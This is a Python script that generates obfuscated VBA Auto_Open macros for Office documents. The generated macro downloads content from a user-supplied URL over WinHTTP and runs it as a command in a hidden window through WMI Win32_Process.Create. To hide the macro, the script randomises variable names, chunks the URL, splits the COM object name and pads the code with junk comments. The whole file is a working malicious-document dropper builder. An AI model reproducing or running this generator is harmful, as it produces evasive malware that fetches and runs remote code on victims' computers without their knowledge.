import string
import random
import argparse

parser = argparse.ArgumentParser(description='macrogenerator')
parser.add_argument('-u','--url', help='setup url for generate-macross', required=True)
args = vars(parser.parse_args())


random_pool_names = []
def generator(size=6, chars=string.ascii_lowercase+ string.ascii_uppercase):
    variable = ''
    for _ in range(size):
        variable += random.choice(chars)

    if variable in random_pool_names:
        variable += random.choice(chars)

    random_pool_names.append(variable)
    return variable


#------------------------------ URL obfuscate Options-----------------
def main():
    var_url_name = generator()
    var_result = generator()
    var_http = generator()
    var_computer = generator()
    var_wmiservice= generator()
    var_startup = generator()
    var_config= generator()
    var_process = generator()
    senselessly = generator(size=79)
    senselessly2 = generator(size=79)
    #------------------------------ URL obfuscate Options-----------------


    url_compiler = ''

    for item in range(0, url.__len__(), 4):
        if item == 0:
            url_compiler += '{URL} = "{context}"\n'.format(URL=var_url_name, context=url[item: item+4])
        else:
            url_compiler += '{URL} = {URL} + "{context}"\n'.format(URL=var_url_name, context=url[item: item + 4])

    macross = r"""
    Sub Auto_Open()
        Dim {strResult} As String
        Dim {objHTTP} As Object
        Dim {URL} As String
        '{senselessly2}'
        Set {objHTTP} = CreateObject("Win" & "Http.Win" & "HttpRequest.5.1")
        {url_config}
        '{senselessly}'
        {objHTTP}.Open "GET", {URL}, False

        {objHTTP}.send ("{URL}")
        {strResult} = {objHTTP}.responseText

        Const HIDDEN_WINDOW = 0

        {strComputer} = "."

        Set {objWMIService} = GetObject("winmgmts:\\" & {strComputer} & "\root\cimv2")

        Set {objStartup} = {objWMIService}.Get("Win32_ProcessStartup")

        Set {objConfig} = {objStartup}.SpawnInstance_

        {objConfig}.ShowWindow = HIDDEN_WINDOW

        Set {objProcess} = GetObject("winmgmts:\\" & {strComputer} & "\root\cimv2:Win32_Process")

        '{senselessly}'
        {objProcess}.Create {strResult}, Null, {objConfig}, intProcessID
        '{senselessly2}'
    End Sub

    """.format(strResult=var_result,
               objHTTP=var_http,
               strComputer=var_computer,
               objWMIService=var_wmiservice,
               objStartup=var_startup,
               objConfig=var_config,
               objProcess=var_process,
               URL=var_url_name,
               url_config=url_compiler,
               senselessly=senselessly,
               senselessly2=senselessly2)

    print('--'*60)
    print(macross)
    print('--'*60)

if __name__ == "__main__":
    url = args['url']
    main()